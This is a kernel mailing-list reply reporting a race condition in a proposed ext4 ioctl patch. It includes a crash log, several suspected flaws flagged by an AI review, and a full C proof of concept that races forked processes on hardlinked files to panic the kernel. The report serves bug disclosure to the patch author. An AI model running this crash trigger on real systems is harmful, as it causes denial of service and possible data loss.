Received: from out162-62-57-137.mail.qq.com (out162-62-57-137.mail.qq.com [162.62.57.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9514C3FBA7
	for <linux-ext4@vger.kernel.org>; Mon, 22 Jun 2026 17:21:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.137
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782148889; cv=none; b=gj+6N2RxFwFGsQjH3Nd+KcnElA2rsIiY+JXdatZzJc77FVjl0X52G4DNCnTuSVc3gPTceFwrvoCtahybp3Q5qE/yPlnGVR+KiCJ2bao1rE5AyxCWnBEM6hEFyKuehiVnYqJSXEo8U30BX/3HCjycSpTezLQUaDI6sY3iO8cnFyo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782148889; c=relaxed/simple;
	bh=sRaBYEOTQSts/K8Ug3TFpIYnWGNpPUsg8P4bPsh/WbA=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=gpLS948M8zMIPgWowm8DeF78jY6w/jascUY36cB5FKedZZJuqOUqoa99ML8EqmhTQvfrkyrZ/F5dtmDtZ0STAQ1ZUlHaVp4ue7mtm8F68+AnrF17zCN9bZjH3VnBm4v4asw7n10jSiJdT9KK7UwbmFLCrbZJMcElfu0iy3x8uSg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=umWtlAku; arc=none smtp.client-ip=162.62.57.137
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="umWtlAku"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782148882; bh=/JAV5NetTD7zqSPHstx8U72rGvQ8250LNIrdHJJ2o2U=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=umWtlAkuhtPb69pWVf75NQ8utUGUGfFEfujlwnaYFlR9Ym6EtepXotlOtQKVUrDiF
	 wfHUZDKW+6ccijYH0XEM5ZUoS9qz1uMiF/Ay0rCm+8xC/KASNhxXHXVLh1SFxpg2/C
	 853CENFMduWYkrssJp6W3dImF6/qICeNkooiEpdc=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrsza53-0.qq.com (NewEsmtp) with SMTP
	id 5543A89B; Tue, 23 Jun 2026 01:21:20 +0800
X-QQ-mid: xmsmtpt1782148880tzognlbln
Message-ID: <tencent_2D1051E0281A7550C4CA60798593BF905B09@qq.com>
X-QQ-XMAILINFO: NMOcRb7Tb1o3E9E6pnnL3QPATKbO+joQmzu4caDbQ2CdMme+qwgVbYmBOpBpjm
	 ssnkAqdu1zlLlc3yrzwUIGtOQPXSXSPn8Ha1LXId1TLYpH6YI7k0UbpUQGj4OS8h6ms/RFFbVdBU
	 qyaxjChtnp2JQXCnu9mYm9st7eeK2W1q7wdZocPkxZ6P/ibVclI0+0ybwouZM6P0Uk8G5YwD+u6O
	 GhgQTGTb2ua6Vq31jAPfqFoK6GcPAI3CQKPw3CO8Urs2nyKSjXNIXIyCa1SnGZc5XjBSxFFy8b6b
	 CkbPJ3nqx+/iWNgDrsG7YEL9IxTB2J89F2g/6uplcepyWUOMkD3Dqdt9ABUEOmvjVijfIcLy/EAZ
	 +8G5d9XdNxHsnQ+BorAg00M2DGdXQ/R7hbUHF3/tT9GTHDho94K01wksVleL6Fv1p/05i4m57bPg
	 qAsGcjr1RNAdkP9NX9D4muzUoZlq0ikQMsXGHF7AXpqMbpRvkdRIs7KXxhtZNmVsUk/xP0xu6fI9
	 oFBHMN7GaWsMf/JxmwAsP7icIBV6JHNtBz7a4nCJNsy+BRbQYKyiXpYEi64PuYUzZWhj6VCbHDRB
	 XtxYEugtHytoqJbbw8p/hn2rVJefu5aRfBQ8nJ3CNWjVXRD2+UEIbPBzS8CyGtYwZHfTHnQmWEjj
	 yFX0lBiNIlh5LQHMs4BQ8/Koj6Ard3T+ovl5VhPNqjD393cM9RK3N07BGcHTP0hVRU6+wBKUo3G8
	 irWdZbgoUS8jCxuYAzFPP9y+v1AGBYpJBEWJA8OQNyC6nj2Zt1hwxCoYqCAx9fpfM3dHs1zKPOh9
	 12H90h9Bx0zrsb6Tnz2CRh0Drmywb5sJrBnr3paXtKXuAX2VNjjx07kd7MiXF3Eq+nrou+D7hrE4
	 kEq/DE4znTCPv+O/7431I+hr0hAPRLIzxGgrTFuFNi7+/AGYgM+WmJLae1NZgKkOk8EEXHzgHFfm
	 CZTpVNtUjeeGAoyaX2JdHtGBeBKSUEFD6xfyP6b09eVwWg0ZsAsLQiprSCKYz+p77+qQuZJyk5lB
	 gnv4KcqqOEeLyZvyoQ/AwXad3UKvMYkLU7PKspcj49hbfu7p+GJQeYTelHlMkyOhjJAoVNszT6Sj
	 8yWPm/X2ePqpITtrNuxT1LyIm0ik8cMlWzSjsbajdADnjUzGofwupjpKLfwA==
X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
X-OQ-MSGID: <54a499eb-1340-4d05-9b5c-e217e7a529f5@qq.com>
Date: Tue, 23 Jun 2026 01:21:20 +0800
Precedence: bulk
X-Mailing-List: linux-ext4@vger.kernel.org
List-Id: <linux-ext4.vger.kernel.org>
List-Subscribe: <mailto:linux-ext4+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-ext4+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3 10/10] ext4: Add EXT4_IOC_SET_LUFID ioctl for setting
 LUFID on directory entries
To: Artem Blagodarenko <artem.blagodarenko@gmail.com>,
 linux-ext4@vger.kernel.org
Cc: adilger.kernel@dilger.ca, Andreas Dilger <adilger@dilger.ca>
References: <20260619191022.27008-1-ablagodarenko@thelustrecollective.com>
 <20260619191022.27008-11-ablagodarenko@thelustrecollective.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260619191022.27008-11-ablagodarenko@thelustrecollective.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Artem,

I came across the Sashiko AI review [1] of this patch and was able to
reproduce a kernel crash triggered by a race condition in
ext4_dirdata_set_lufid().  I wanted to share the evidence in case it's
helpful.

The core issue is that EXT4_I(inode)->i_dirdata is set to a
stack-local pointer without locking the target inode:

 > +static int ext4_dirdata_set_lufid(struct inode *dir,
 > +                                  const char *name, int namelen,
 > +                                  struct ext4_dentry_param *edp)
 > +{
 > ...
 > +    EXT4_I(inode)->i_dirdata = edp;

The function locks the parent directory (inode_lock(dir)), but does NOT
lock the target inode.  If two threads operate on different hardlinks
to the *same* inode (in different directories), they race to overwrite
inode->i_dirdata with each other's stack-local edp pointers.  The
winner's stack pointer is later consumed through ext4_add_entry() →
ext4_lookup() → ext4_dentry_get_fid(), reading from a stale or
overwritten stack frame.

With KASAN enabled this manifests as a null-ptr-deref because KASAN
poisons freed stack memory.

[Reproduction]

The PoC creates two subdirectories (/mnt/test/da and /mnt/test/db),
hardlinks the same file into both, then runs 8 child processes that
hammer EXT4_IOC_SET_LUFID on the two directories simultaneously via
ioctl().  Each child is pinned to a specific CPU to maximize the race
window.  The kernel panics within a few seconds.

[Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]

   Oops: general protection fault, probably for non-canonical address
   0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
   KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]

   RIP: 0010:ext4_dirdata_set_lufid+0x3e8/0xb00
   RAX: dffffc0000000000 RBX: 0000000000000000
   ...
   Call Trace:
    <TASK>
    ext4_ioctl_set_lufid+0x2d9/0x350
    __ext4_ioctl+0x1d2/0x43c0
    __x64_sys_ioctl+0x193/0x210
    do_syscall_64+0x129/0x850
    entry_SYSCALL_64_after_hwframe+0x77/0x7f
    </TASK>

The same crash was independently hit by a second thread at [#2],
confirming the race condition.

Additionally, the Sashiko review [1] noted a few other issues in this
patch that may be worth checking:

- The ioctl does not reject '.' and '..' — modifying these special
   entries via EXT4_IOC_SET_LUFID would corrupt the directory layout.

- The ddh_length computation in ext4_find_dest_de() appears to
   exclude the header size (1 byte), which can cause the header and
   data insertion to overflow by one byte into the adjacent directory
   entry when (fname_len + esl_data_len) % 4 == 0.

- The handler calls mnt_want_write_file() but omits an explicit
   inode_permission(dir, MAY_WRITE) check, which may allow an
   unprivileged user with read-only access to the directory to
   modify directory entries.

The PoC is attached below.  It compiles with:

   gcc -o poc poc.c -static

[1] 
https://sashiko.dev/#/patchset/20260619191022.27008-1-ablagodarenko%40thelustrecollective.com
     (Sashiko AI code review — "Dangling Pointer", Severity: Critical)

Thanks,
XIAO

// PoC: race on EXT4_I(inode)->i_dirdata via EXT4_IOC_SET_LUFID
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <linux/loop.h>
#include <linux/fs.h>

struct ext4_set_lufid {
     uint8_t  esl_name_len;
     char     esl_name[256];
     uint8_t  esl_data_len;
     char     esl_data[255];
};
#define EXT4_IOC_SET_LUFID _IOW('f', 47, struct ext4_set_lufid)
#define MNT "/mnt/test"

int main(void)
{
     int fd, ret;

     setvbuf(stdout, NULL, _IONBF, 0);
     printf("=== EXT4_IOC_SET_LUFID PoC ===\n\n");

     /* Setup loopback ext4 filesystem */
     system("umount -l /mnt/test 2>/dev/null; losetup -d /dev/loop0 
2>/dev/null; true");
     system("rm -rf /mnt/test /tmp/img 2>/dev/null");
     mkdir(MNT, 0755);
     system("dd if=/dev/zero of=/tmp/img bs=1M count=64 2>/dev/null");
     system("losetup /dev/loop0 /tmp/img 2>/dev/null");
     system("mkfs.ext4 -F -b 1024 -O ^metadata_csum,^64bit,^flex_bg 
/dev/loop0 2>/dev/null");
     if (mount("/dev/loop0", MNT, "ext4", 0, NULL) != 0) {
         printf("Mount failed\n"); return 1;
     }

     /* Create target file with two hardlinks in different directories */
     mkdir(MNT "/da", 0755);
     mkdir(MNT "/db", 0755);
     close(open(MNT "/t", O_CREAT|O_WRONLY, 0644));
     link(MNT "/t", MNT "/da/t");
     link(MNT "/t", MNT "/db/t");

     printf("Racing EXT4_IOC_SET_LUFID on hardlinks...\n");
     for (int r = 0; r < 20; r++) {
         pid_t kids[8];
         for (int i = 0; i < 8; i++) {
             kids[i] = fork();
             if (kids[i] == 0) {
                 /* Half target /da, half target /db — same inode */
                 const char *dir = (i < 4) ? MNT "/da" : MNT "/db";
                 cpu_set_t cpuset;
                 CPU_ZERO(&cpuset);
                 CPU_SET(i % 2, &cpuset);
                 sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

                 for (int j = 0; j < 5000; j++) {
                     struct ext4_set_lufid l = {0};
                     l.esl_name_len = 2;
                     memcpy(l.esl_name, "t\0", 2);
                     l.esl_data_len = 5;
                     memcpy(l.esl_data, "ABCDE", 5);
                     int f = open(dir, O_RDONLY);
                     if (f >= 0) {
                         ioctl(f, EXT4_IOC_SET_LUFID, &l);
                         close(f);
                     }
                 }
                 _exit(0);
             }
         }
         for (int i = 0; i < 8; i++) {
             int ws;
             waitpid(kids[i], &ws, 0);
         }
         printf("."); fflush(stdout);
     }
     printf("\n");

     printf("\n=== dmesg ===\n"); fflush(stdout);
     system("dmesg | grep -iE 'KASAN|BUG:|Call Trace|general protection' 
| tail -40");

     umount(MNT);
     system("losetup -d /dev/loop0 2>/dev/null");
     printf("Done.\n");
     return 0;
}

